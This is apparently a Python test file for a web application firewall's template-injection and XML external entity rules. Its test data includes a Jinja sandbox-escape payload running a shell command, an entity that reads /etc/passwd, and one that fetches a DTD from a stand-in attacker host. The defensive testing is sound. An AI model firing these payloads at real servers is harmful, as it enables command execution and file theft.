"""
SSTI and XXE Detection Rule Tests.
"""

from bastion.core.normalizer import normalize_request
from bastion.rules.ssti import SSTIRule
from bastion.rules.xxe import XXERule


def test_ssti_jinja_arithmetic_probe_blocked():
    rule = SSTIRule()
    req = normalize_request("GET", "/receipt", query_string="name={{7*7}}")
    verdict = rule.match(req)
    assert verdict.blocked
    assert verdict.rule_id == "933100"


def test_ssti_sandbox_escape_blocked():
    rule = SSTIRule()
    payload = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
    req = normalize_request("GET", "/receipt", query_string=f"name={payload}")
    verdict = rule.match(req)
    assert verdict.blocked
    assert verdict.rule_id == "933100"


def test_ssti_clean_input_allowed():
    rule = SSTIRule()
    req = normalize_request("GET", "/receipt", query_string="name=Valued Customer Alice")
    verdict = rule.match(req)
    assert not verdict.blocked


def test_xxe_system_entity_blocked():
    rule = XXERule()
    xml_payload = '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>'
    req = normalize_request("POST", "/api/upload_xml", body=xml_payload.encode())
    verdict = rule.match(req)
    assert verdict.blocked
    assert verdict.rule_id == "933200"


def test_xxe_parameter_entity_blocked():
    rule = XXERule()
    xml_payload = '<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">'
    req = normalize_request("POST", "/api/upload_xml", body=xml_payload.encode())
    verdict = rule.match(req)
    assert verdict.blocked
    assert verdict.rule_id == "933200"


def test_xxe_clean_xml_allowed():
    rule = XXERule()
    xml_payload = '<user><id>123</id><name>Alice Smith</name><role>Admin</role></user>'
    req = normalize_request("POST", "/api/upload_xml", body=xml_payload.encode())
    verdict = rule.match(req)
    assert not verdict.blocked
